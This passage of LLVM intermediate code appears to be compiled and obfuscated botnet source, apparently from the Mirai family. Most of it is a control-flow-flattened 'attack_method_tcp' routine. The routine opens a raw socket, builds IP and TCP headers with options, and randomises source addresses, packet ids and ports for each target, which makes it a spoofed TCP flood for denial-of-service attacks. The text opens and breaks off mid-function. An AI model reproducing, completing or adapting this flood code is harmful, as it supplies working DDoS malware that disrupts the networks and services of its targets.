  br label %loopEnd

; <label>:2586:                                   ; preds = %loopEntry
  store i32 -549944157, i32* %switchVar
  br label %loopEnd

; <label>:2587:                                   ; preds = %loopEntry
  store i32 -859888446, i32* %switchVar
  br label %loopEnd

; <label>:2588:                                   ; preds = %loopEntry
  store i32 1725086466, i32* %switchVar
  br label %loopEnd

; <label>:2589:                                   ; preds = %loopEntry
  store i32 -1410630838, i32* %switchVar
  br label %loopEnd

; <label>:2590:                                   ; preds = %loopEntry
  store i32 -218755353, i32* %switchVar
  br label %loopEnd

; <label>:2591:                                   ; preds = %loopEntry
  %2592 = load i32, i32* %9, align 4
  %2593 = add nsw i32 %2592, 1
  store i32 %2593, i32* %9, align 4
  store i32 -1529631243, i32* %switchVar
  br label %loopEnd

; <label>:2594:                                   ; preds = %loopEntry
  store i32 -728621910, i32* %switchVar
  br label %loopEnd

; <label>:2595:                                   ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %2594, %2591, %2590, %2589, %2588, %2587, %2586, %2583, %2576, %2575, %2574, %2565, %2560, %2555, %2551, %2549, %2538, %2537, %2530, %2529, %2528, %2527, %2526, %2525, %2494, %2493, %2489, %2488, %2487, %2484, %2471, %2470, %2464, %2461, %2453, %2443, %2422, %2412, %2406, %2400, %2399, %2398, %2393, %2306, %2297, %2264, %2253, %2242, %2238, %2234, %2225, %2219, %2210, %2209, %2200, %2195, %2190, %2186, %2184, %2161, %2149, %2143, %2142, %2135, %2134, %2127, %2118, %2117, %2114, %2111, %2106, %2103, %2095, %2084, %2083, %2082, %2075, %2074, %2073, %2072, %2061, %2048, %2039, %2032, %2031, %2030, %2019, %2006, %1997, %1991, %1986, %1981, %1978, %1973, %1964, %1955, %1945, %1942, %1935, %1924, %1922, %1920, %1913, %1909, %1905, %1902, %1901, %1888, %1869, %1860, %1847, %1834, %1831, %1816, %1807, %1804, %1802, %1794, %1785, %1776, %1768, %1765, %1758, %1746, %1743, %1731, %1724, %1723, %1720, %1719, %1718, %1707, %1698, %1685, %1678, %1677, %1676, %1665, %1652, %1643, %1637, %1632, %1627, %1624, %1619, %1610, %1601, %1591, %1588, %1581, %1568, %1565, %1558, %1546, %1543, %1531, %1524, %1520, %1519, %1518, %1517, %1502, %1497, %1493, %1490, %1489, %1488, %1476, %1469, %1467, %1458, %1455, %1454, %1453, %1444, %1438, %1430, %1415, %1399, %1396, %1387, %1370, %1367, %1350, %1348, %1343, %1333, %1332, %1329, %1328, %1318, %1315, %1308, %1296, %1293, %1281, %1274, %1273, %1272, %1269, %1256, %1253, %1246, %1234, %1231, %1219, %1210, %1209, %1208, %1205, %1192, %1189, %1182, %1170, %1167, %1155, %1146, %1143, %1136, %1133, %1121, %1120, %1116, %1110, %1101, %1091, %1084, %1066, %1065, %1056, %1053, %1049, %1040, %1022, %1021, %1011, %1006, %1005, %1004, %994, %993, %989, %986, %985, %984, %983, %982, %981, %980, %979, %970, %961, %954, %953, %948, %926, %919, %918, %913, %891, %884, %883, %878, %856, %849, %848, %843, %808, %800, %790, %782, %772, %765, %762, %743, %736, %729, %723, %682, %569, %562, %561, %556, %534, %525, %517, %510, %509, %504, %446, %445, %439, %434, %427, %420, %419, %416, %413, %407, %396, %391, %390, %381, %380, %371, %368, %367, %364, %355, %NewDefault, %346, %337, %328, %319, %310, %LeafBlock, %NodeBlock, %LeafBlock1, %NodeBlock3, %NodeBlock5, %NodeBlock7, %301, %271, %234, %206, %163, %158, %153, %152, %148, %145, %144, %135, %126, %117, %111, %110, %109, %104, %103, %98, %97, %92, %91, %87, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i32 @util_strlen(i8*) #3

declare void @table_unlock_val(i8 zeroext) #3

declare i32 @util_strcpy(i8*, i8*) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

declare i32 @rand_next() #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i8* @table_retrieve_val(i32, i32*) #3

declare void @table_lock_val(i8 zeroext) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare void @util_zero(i8*, i32) #3

declare i8* @util_itoa(i32, i32, i8*) #3

declare signext i8 @util_strcmp(i8*, i8*) #3

declare i64 @send(i32, i8*, i64, i32) #3

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #3

declare i32 @util_memsearch(i8*, i32, i8*, i32) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

declare signext i8 @util_strncmp(i8*, i8*, i32) #3

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 1)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 315702364, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 315702364, label %first
    i32 -953496175, label %99
    i32 1351851143, label %100
    i32 -2057868957, label %106
    i32 -444413717, label %109
    i32 1338363146, label %110
    i32 1824650997, label %116
    i32 -1687204815, label %160
    i32 764974927, label %164
    i32 -1646785665, label %289
    i32 1031056658, label %292
    i32 -1919529451, label %293
    i32 1152337798, label %294
    i32 541627053, label %300
    i32 1093711415, label %320
    i32 -1038845871, label %341
    i32 198410166, label %345
    i32 -820319613, label %349
    i32 29029226, label %354
    i32 703913825, label %360
    i32 -101339353, label %365
    i32 469817373, label %371
    i32 -1535226999, label %376
    i32 628125405, label %382
    i32 1921115109, label %386
    i32 1582985724, label %390
    i32 -309048737, label %394
    i32 -1729983192, label %398
    i32 -1528970522, label %402
    i32 1563720651, label %408
    i32 506772235, label %446
    i32 -1317477995, label %449
    i32 977030733, label %450
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %97 = icmp eq i32 %.reload, -1
  %98 = select i1 %97, i32 -953496175, i32 1351851143
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  store i32 977030733, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %101 = load i32, i32* %10, align 4
  %102 = bitcast i32* %9 to i8*
  %103 = call i32 @setsockopt(i32 %101, i32 0, i32 3, i8* %102, i32 4) #6
  %104 = icmp eq i32 %103, -1
  %105 = select i1 %104, i32 -2057868957, i32 -444413717
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %10, align 4
  %108 = call i32 @close(i32 %107)
  store i32 977030733, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1338363146, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %9, align 4
  %112 = load i8, i8* %5, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp slt i32 %111, %113
  %115 = select i1 %114, i32 1824650997, i32 1031056658
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %118 = load i8**, i8*** %11, align 8
  %119 = load i32, i32* %9, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8*, i8** %118, i64 %120
  store i8* %117, i8** %121, align 8
  %122 = load i8**, i8*** %11, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds i8*, i8** %122, i64 %124
  %126 = load i8*, i8** %125, align 8
  %127 = bitcast i8* %126 to %struct.iphdr*
  store %struct.iphdr* %127, %struct.iphdr** %27, align 8
  %128 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i64 1
  %130 = bitcast %struct.iphdr* %129 to %struct.tcphdr*
  store %struct.tcphdr* %130, %struct.tcphdr** %28, align 8
  %131 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %132 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %131, i64 1
  %133 = bitcast %struct.tcphdr* %132 to i8*
  store i8* %133, i8** %29, align 8
  %134 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %135 = bitcast %struct.iphdr* %134 to i8*
  %136 = load i8, i8* %135, align 4
  %137 = and i8 %136, 15
  %138 = or i8 %137, 64
  store i8 %138, i8* %135, align 4
  %139 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %140 = bitcast %struct.iphdr* %139 to i8*
  %141 = load i8, i8* %140, align 4
  %142 = and i8 %141, -16
  %143 = or i8 %142, 5
  store i8 %143, i8* %140, align 4
  %144 = load i8, i8* %12, align 1
  %145 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 1
  store i8 %144, i8* %146, align 1
  %147 = call zeroext i16 @htons(i16 zeroext 60) #7
  %148 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 2
  store i16 %147, i16* %149, align 2
  %150 = load i16, i16* %13, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 3
  store i16 %151, i16* %153, align 4
  %154 = load i8, i8* %14, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 5
  store i8 %154, i8* %156, align 4
  %157 = load i8, i8* %15, align 1
  %158 = icmp ne i8 %157, 0
  %159 = select i1 %158, i32 -1687204815, i32 764974927
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 4
  store i16 %161, i16* %163, align 2
  store i32 764974927, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 6
  store i8 6, i8* %166, align 1
  %167 = load i32, i32* %26, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 8
  store i32 %167, i32* %169, align 4
  %170 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %171 = load i32, i32* %9, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i64 %172
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i32 0, i32 1
  %175 = load i32, i32* %174, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 9
  store i32 %175, i32* %177, align 4
  %178 = load i16, i16* %16, align 2
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %181 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %180, i32 0, i32 0
  store i16 %179, i16* %181, align 4
  %182 = load i16, i16* %17, align 2
  %183 = call zeroext i16 @htons(i16 zeroext %182) #7
  %184 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 1
  store i16 %183, i16* %185, align 2
  %186 = load i32, i32* %18, align 4
  %187 = trunc i32 %186 to i16
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = zext i16 %188 to i32
  %190 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 2
  store i32 %189, i32* %191, align 4
  %192 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -241
  %196 = or i16 %195, 160
  store i16 %196, i16* %193, align 4
  %197 = load i8, i8* %20, align 1
  %198 = sext i8 %197 to i16
  %199 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %200 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %199, i32 0, i32 4
  %201 = load i16, i16* %200, align 4
  %202 = and i16 %198, 1
  %203 = shl i16 %202, 13
  %204 = and i16 %201, -8193
  %205 = or i16 %204, %203
  store i16 %205, i16* %200, align 4
  %206 = load i8, i8* %21, align 1
  %207 = sext i8 %206 to i16
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 4
  %210 = load i16, i16* %209, align 4
  %211 = and i16 %207, 1
  %212 = shl i16 %211, 12
  %213 = and i16 %210, -4097
  %214 = or i16 %213, %212
  store i16 %214, i16* %209, align 4
  %215 = load i8, i8* %22, align 1
  %216 = sext i8 %215 to i16
  %217 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %216, 1
  %221 = shl i16 %220, 11
  %222 = and i16 %219, -2049
  %223 = or i16 %222, %221
  store i16 %223, i16* %218, align 4
  %224 = load i8, i8* %23, align 1
  %225 = sext i8 %224 to i16
  %226 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 4
  %228 = load i16, i16* %227, align 4
  %229 = and i16 %225, 1
  %230 = shl i16 %229, 10
  %231 = and i16 %228, -1025
  %232 = or i16 %231, %230
  store i16 %232, i16* %227, align 4
  %233 = load i8, i8* %24, align 1
  %234 = sext i8 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 4
  %237 = load i16, i16* %236, align 4
  %238 = and i16 %234, 1
  %239 = shl i16 %238, 9
  %240 = and i16 %237, -513
  %241 = or i16 %240, %239
  store i16 %241, i16* %236, align 4
  %242 = load i8, i8* %25, align 1
  %243 = sext i8 %242 to i16
  %244 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = and i16 %243, 1
  %248 = shl i16 %247, 8
  %249 = and i16 %246, -257
  %250 = or i16 %249, %248
  store i16 %250, i16* %245, align 4
  %251 = load i8*, i8** %29, align 8
  %252 = getelementptr inbounds i8, i8* %251, i32 1
  store i8* %252, i8** %29, align 8
  store i8 2, i8* %251, align 1
  %253 = load i8*, i8** %29, align 8
  %254 = getelementptr inbounds i8, i8* %253, i32 1
  store i8* %254, i8** %29, align 8
  store i8 6, i8* %253, align 1
  %255 = call i32 @rand_next()
  %256 = and i32 %255, 15
  %257 = add i32 1458, %256
  %258 = trunc i32 %257 to i16
  %259 = call zeroext i16 @htons(i16 zeroext %258) #7
  %260 = load i8*, i8** %29, align 8
  %261 = bitcast i8* %260 to i16*
  store i16 %259, i16* %261, align 2
  %262 = load i8*, i8** %29, align 8
  %263 = getelementptr inbounds i8, i8* %262, i64 2
  store i8* %263, i8** %29, align 8
  %264 = load i8*, i8** %29, align 8
  %265 = getelementptr inbounds i8, i8* %264, i32 1
  store i8* %265, i8** %29, align 8
  store i8 4, i8* %264, align 1
  %266 = load i8*, i8** %29, align 8
  %267 = getelementptr inbounds i8, i8* %266, i32 1
  store i8* %267, i8** %29, align 8
  store i8 2, i8* %266, align 1
  %268 = load i8*, i8** %29, align 8
  %269 = getelementptr inbounds i8, i8* %268, i32 1
  store i8* %269, i8** %29, align 8
  store i8 8, i8* %268, align 1
  %270 = load i8*, i8** %29, align 8
  %271 = getelementptr inbounds i8, i8* %270, i32 1
  store i8* %271, i8** %29, align 8
  store i8 10, i8* %270, align 1
  %272 = call i32 @rand_next()
  %273 = load i8*, i8** %29, align 8
  %274 = bitcast i8* %273 to i32*
  store i32 %272, i32* %274, align 4
  %275 = load i8*, i8** %29, align 8
  %276 = getelementptr inbounds i8, i8* %275, i64 4
  store i8* %276, i8** %29, align 8
  %277 = load i8*, i8** %29, align 8
  %278 = bitcast i8* %277 to i32*
  store i32 0, i32* %278, align 4
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i64 4
  store i8* %280, i8** %29, align 8
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 1, i8* %281, align 1
  %283 = load i8*, i8** %29, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %29, align 8
  store i8 3, i8* %283, align 1
  %285 = load i8*, i8** %29, align 8
  %286 = getelementptr inbounds i8, i8* %285, i32 1
  store i8* %286, i8** %29, align 8
  store i8 3, i8* %285, align 1
  %287 = load i8*, i8** %29, align 8
  %288 = getelementptr inbounds i8, i8* %287, i32 1
  store i8* %288, i8** %29, align 8
  store i8 8, i8* %287, align 1
  store i32 -1646785665, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i32, i32* %9, align 4
  %291 = add nsw i32 %290, 1
  store i32 %291, i32* %9, align 4
  store i32 1338363146, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  store i32 -1919529451, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1152337798, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %9, align 4
  %296 = load i8, i8* %5, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp slt i32 %295, %297
  %299 = select i1 %298, i32 541627053, i32 -1317477995
  store i32 %299, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  %301 = load i8**, i8*** %11, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  %305 = load i8*, i8** %304, align 8
  store i8* %305, i8** %30, align 8
  %306 = load i8*, i8** %30, align 8
  %307 = bitcast i8* %306 to %struct.iphdr*
  store %struct.iphdr* %307, %struct.iphdr** %31, align 8
  %308 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %309 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %308, i64 1
  %310 = bitcast %struct.iphdr* %309 to %struct.tcphdr*
  store %struct.tcphdr* %310, %struct.tcphdr** %32, align 8
  %311 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 2
  %316 = load i8, i8* %315, align 4
  %317 = zext i8 %316 to i32
  %318 = icmp slt i32 %317, 32
  %319 = select i1 %318, i32 1093711415, i32 -1038845871
  store i32 %319, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %322 = load i32, i32* %9, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %321, i64 %323
  %325 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %324, i32 0, i32 1
  %326 = load i32, i32* %325, align 4
  %327 = call i32 @ntohl(i32 %326) #7
  %328 = call i32 @rand_next()
  %329 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i32 0, i32 2
  %334 = load i8, i8* %333, align 4
  %335 = zext i8 %334 to i32
  %336 = lshr i32 %328, %335
  %337 = add i32 %327, %336
  %338 = call i32 @htonl(i32 %337) #7
  %339 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 9
  store i32 %338, i32* %340, align 4
  store i32 -1038845871, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i32, i32* %26, align 4
  %343 = icmp eq i32 %342, -1
  %344 = select i1 %343, i32 198410166, i32 -820319613
  store i32 %344, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = call i32 @rand_next()
  %347 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 8
  store i32 %346, i32* %348, align 4
  store i32 -820319613, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i16, i16* %13, align 2
  %351 = zext i16 %350 to i32
  %352 = icmp eq i32 %351, 65535
  %353 = select i1 %352, i32 29029226, i32 703913825
  store i32 %353, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  %355 = call i32 @rand_next()
  %356 = and i32 %355, 65535
  %357 = trunc i32 %356 to i16
  %358 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 3
  store i16 %357, i16* %359, align 4
  store i32 703913825, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i16, i16* %16, align 2
  %362 = zext i16 %361 to i32
  %363 = icmp eq i32 %362, 65535
  %364 = select i1 %363, i32 -101339353, i32 469817373
  store i32 %364, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  %366 = call i32 @rand_next()
  %367 = and i32 %366, 65535
  %368 = trunc i32 %367 to i16
  %369 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %370 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %369, i32 0, i32 0
  store i16 %368, i16* %370, align 4
  store i32 469817373, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = load i16, i16* %17, align 2
  %373 = zext i16 %372 to i32
  %374 = icmp eq i32 %373, 65535
  %375 = select i1 %374, i32 -1535226999, i32 628125405
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
